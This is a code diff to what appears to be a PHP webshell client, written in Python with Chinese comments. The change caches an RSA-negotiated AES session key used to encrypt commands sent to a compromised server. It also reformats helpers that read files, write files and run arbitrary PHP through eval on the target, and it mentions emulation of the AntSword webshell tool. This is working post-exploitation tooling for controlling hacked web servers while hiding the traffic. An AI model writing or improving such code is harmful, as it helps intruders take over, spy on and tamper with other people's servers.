@@ -580,6 +580,7 @@ def base64_encode(s: t.Union[str, bytes]):
         s = s.encode("utf-8")
     return base64.b64encode(s).decode()
 
+
 def string_repr(s: str) -> str:
     """给出字符串的PHP表达式，在字符串较为复杂时使用base64编码"""
     r = repr(s)
@@ -605,6 +606,25 @@ def to_sessionize_payload(
     final = PAYLOAD_SESSIONIZE_TRIGGER.replace("PAYLOAD_STORE", payload_store_name)
     payloads.append(final)
     return payloads
+
+
+async def get_aes_key(pubkey, submitter):
+    session_name = f"rsa_key_{uuid.uuid4()}"
+    key_encrypted = await submitter(
+        ENCRYPTION_SENDKEY_PHP.replace("PUBKEY_B64", string_repr(base64_encode(pubkey)))
+        .replace("SESSION_NAME", string_repr(session_name))
+        .replace("    ", "")
+        .strip()
+    )
+    if key_encrypted == "WRONG_NO_OPENSSL":
+        raise exceptions.TargetRuntimeError("目标不支持OpenSSL扩展！")
+    try:
+        key = private_decrypt_rsa(key_encrypted)
+    except Exception as exc:
+        raise exceptions.TargetRuntimeError(
+            "部署加密失败，无法从服务器获得对应的key"
+        ) from exc
+    return session_name, key
 
 
 # 给前端显示的PHPWebshellOptions选项
@@ -664,6 +684,7 @@ php_webshell_conn_options = [
     ),
 ]
 
+
 # 注意：在继承的时候必须复用HTTP client（或者至少在cookie里指定session id），否则某些功能无法工作
 class PHPWebshell(PHPSessionInterface):
     """PHP session各类工具函数的实现"""
@@ -681,6 +702,12 @@ class PHPWebshell(PHPSessionInterface):
         # for upload file and download file
         self.chunk_size = 32 * 1024
         self.max_coro = 4
+
+        # AES key以及其在服务器session中存储的名字
+        # 在和服务器握手获取key的时候需要加锁
+        self.fetchkey_lock = asyncio.Lock()
+        self.aes_session_name = None
+        self.aes_key = None
 
     def encode(self, payload: str) -> str:
         """应用编码器"""
@@ -732,9 +759,9 @@ class PHPWebshell(PHPSessionInterface):
     async def get_file_contents(
         self, filepath: str, max_size: int = 1024 * 200
     ) -> bytes:
-        php_code = GET_FILE_CONTENT_PHP.replace("FILE_PATH", string_repr(filepath)).replace(
-            "MAX_SIZE", str(max_size)
-        )
+        php_code = GET_FILE_CONTENT_PHP.replace(
+            "FILE_PATH", string_repr(filepath)
+        ).replace("MAX_SIZE", str(max_size))
         result = await self.submit(php_code)
         if result == "WRONG_NOT_FILE":
             raise exceptions.FileError("目标不是一个文件")
@@ -745,9 +772,9 @@ class PHPWebshell(PHPSessionInterface):
         return base64.b64decode(result)
 
     async def put_file_contents(self, filepath: str, content: bytes) -> bool:
-        php_code = PUT_FILE_CONTENT_PHP.replace("FILE_PATH", string_repr(filepath)).replace(
-            "FILE_CONTENT", string_repr(base64_encode(content))
-        )
+        php_code = PUT_FILE_CONTENT_PHP.replace(
+            "FILE_PATH", string_repr(filepath)
+        ).replace("FILE_CONTENT", string_repr(base64_encode(content)))
         result = await self.submit(php_code)
         if result == "WRONG_NOT_FILE":
             raise exceptions.FileError("目标不是一个文件")
@@ -956,6 +983,14 @@ class PHPWebshell(PHPSessionInterface):
         except BinasciiError as exc:
             raise exceptions.PayloadOutputError("base64解码接收到的数据失败") from exc
 
+    async def communicate_aes_key(self, submitter):
+        async with self.fetchkey_lock:
+            pubkey, _ = get_rsa_key()
+            if not self.aes_key:
+                self.aes_session_name, self.aes_key = await get_aes_key(
+                    pubkey, submitter
+                )
+
     def sessionize_payload_wrapper(
         self, submitter: t.Callable[[str], t.Awaitable[str]]
     ) -> t.Callable[[str], t.Awaitable[str]]:
@@ -1018,36 +1053,25 @@ class PHPWebshell(PHPSessionInterface):
     def encryption_wrapper(
         self, submitter: t.Callable[[str], t.Awaitable[str]]
     ) -> t.Callable[[str], t.Awaitable[str]]:
-        pubkey, _ = get_rsa_key()
 
         @functools.wraps(submitter)
         async def wrap(payload: str) -> str:
             payload = f"eval(base64_decode({base64_encode(payload)!r}));"
-            session_name = f"rsa_key_{uuid.uuid4()}"
-            key_encrypted = await submitter(
-                ENCRYPTION_SENDKEY_PHP.replace(
-                    "PUBKEY_B64", string_repr(base64_encode(pubkey))
-                )
-                .replace("SESSION_NAME", string_repr(session_name))
-                .replace("    ", "")
-                .strip()
-            )
-            if key_encrypted == "WRONG_NO_OPENSSL":
-                raise exceptions.TargetRuntimeError("目标不支持OpenSSL扩展！")
-            try:
-                key = private_decrypt_rsa(key_encrypted)
-            except Exception as exc:
-                raise exceptions.TargetRuntimeError(
-                    "部署加密失败，无法从服务器获得对应的key"
-                ) from exc
-            payload_enc = encrypt_aes256_cbc(key, payload.encode("utf-8"))
+            await self.communicate_aes_key(submitter)
+            assert (
+                self.aes_key is not None and self.aes_session_name is not None
+            ), "Internal error: these should be set after handshake"
+            payload_enc = encrypt_aes256_cbc(self.aes_key, payload.encode("utf-8"))
 
             result_enc = await submitter(
-                ENCRYPTION_COMMUNICATE_PHP.replace("SESSION_NAME", string_repr(session_name))
+                ENCRYPTION_COMMUNICATE_PHP.replace(
+                    "SESSION_NAME", string_repr(self.aes_session_name)
+                )
                 .replace("CODE_ENC", string_repr(base64_encode(payload_enc)))
-                .replace("    ", "")
             )
             if result_enc == "WRONG_NO_SESSION":
+                self.aes_key = None
+                self.aes_session_name = None
                 raise exceptions.TargetRuntimeError("目标不支持session")
             if result_enc == "WRONG_NO_OPENSSL":
                 raise exceptions.TargetRuntimeError("目标不支持openssl")
@@ -1055,7 +1079,7 @@ class PHPWebshell(PHPSessionInterface):
                 return ""
             try:
                 result_enc = base64.b64decode(result_enc)
-                result = decrypt_aes256_cbc(key, result_enc).decode("utf-8")
+                result = decrypt_aes256_cbc(self.aes_key, result_enc).decode("utf-8")
                 return result
             except Exception as exc:
                 raise exceptions.PayloadOutputError("解密失败") from exc
@@ -1137,7 +1161,9 @@ class PHPWebshell(PHPSessionInterface):
         raise NotImplementedError("这个函数应该由实际的实现override")
 
     async def php_eval(self, code: str) -> str:
-        result = await self.submit(EVAL_PHP.format(code_b64=string_repr(base64_encode(code))))
+        result = await self.submit(
+            EVAL_PHP.format(code_b64=string_repr(base64_encode(code)))
+        )
         return result
 
     async def emulated_antsword(self, body: bytes) -> t.Tuple[int, str]:
